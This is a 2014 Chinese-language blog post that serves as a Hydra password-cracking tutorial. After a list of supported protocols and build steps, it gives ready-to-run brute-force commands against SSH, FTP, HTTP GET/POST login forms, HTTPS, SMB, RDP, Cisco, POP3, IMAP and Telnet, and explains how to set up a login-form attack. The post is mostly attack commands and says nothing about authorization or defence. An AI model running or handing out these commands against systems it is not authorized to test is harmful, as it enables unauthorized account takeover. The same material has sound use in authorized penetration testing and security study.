---
layout: post_item
status: publish
published: true
title: hydra，对会话认证的攻击
author: jsongo
wordpress_id: 234
wordpress_url: http://jsongo.com/?p=234
date: '2014-02-18 02:15:34 +0800'
date_gmt: '2014-02-17 18:15:34 +0800'
categories: [security]
tags: [hack]
comments: []
---
官网：https://www.thc.org/thc-hydra/

它支持破解很多种协议，常见的有HTTP-FORM-GET，HTTP-FORM-POST，SSH等，另外还有（来自官网）：

Asterisk，AFP，思科，CVS，Firebird，FTP，HTTP-GET，HTTP头，HTTP代理，HTTPS-FORM-GET，HTTPS-FORM POST，IMAP，HTTP代理，HTTPS的GET，HTTPS头，ICQ，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle的监听，Oracle的SID，oracle数据库，PCAnywhere，PCNFS，POP3，POSTGRES，RDP，REXEC，Rlogin，RSH，SAP/R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，TeamSpeak（TS2），telnet，VMware的认证，VNC和XMPP

(Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, S7-300, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP)

可谓无所不能。不过使用的时候，一般都需要一个字典文件。只要你的字典够强大，网络任你行。

在mac上实验。下载源码包，需要手动编译。安装前先装好pcre和libssh两个库。

然后就是./configure &amp;&amp; make &amp;&amp; make install了

破解ssh登录认证：

{% highlight bash %}

hydra jsongo.com ssh&nbsp;&nbsp;-l root -P tmp.txt

{% endhighlight %}
破解post用户名密码：

破解ftp：

{% highlight bash %}
# hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br />
# hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV<br />
{% endhighlight %}
get方式提交，破解web登录：

{% highlight bash %}
# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/<br />
# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php<br />
{% endhighlight %}
post方式提交，破解web登录：<br />
该软件的强大之处就在于支持多种协议的破解，同样也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具有一个不好的地方就是，如果目标网站登录时候需要验证码就无法破解了。带参数破解如下：

{% highlight html %}

<form action="index.php" method="POST">
<input type="text" name="name" /><BR><br><br />
<input type="password" name="pwd" /><br><br><br />
<input type="submit" name="sub" value="提交"><br />
</form><br />
{% endhighlight %}

假设有以上一个密码登录表单，我们执行命令：

{% highlight bash %}
# hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form &ldquo;index.php:name=^USER^&amp;pwd=^PASS^:<title>invalido</title>&rdquo;<br />
{% endhighlight %}

说明：破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t 是同时线程数为1，-f 是当破解了一个密码就停止，ip 是本地，就是目标ip，http-post-form表示破解是采用http 的post 方式提交的表单密码破解。

后面参数是网页中对应的表单字段的name 属性，后面<title>中的内容是表示错误猜解的返回信息提示，可以自定义。

{% highlight bash %}
破解https：
# hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https
破解teamspeak：
# hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
破解cisco：
# hydra -P pass.txt 10.36.16.18 cisco
# hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable
破解smb：
# hydra -l administrator -P pass.txt 10.36.16.18 smb
破解pop3：
# hydra -l muts -P pass.txt my.pop3.mail pop3
破解rdp：
# hydra ip rdp -l administrator -P pass.txt -V
破解http-proxy：
# hydra -l admin -P pass.txt http-proxy://10.36.16.18
破解imap：
# hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
# hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
破解telnet
# hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V
{% endhighlight %}
最后的示例来自：http://www.cnblogs.com/patf/p/3142564.html

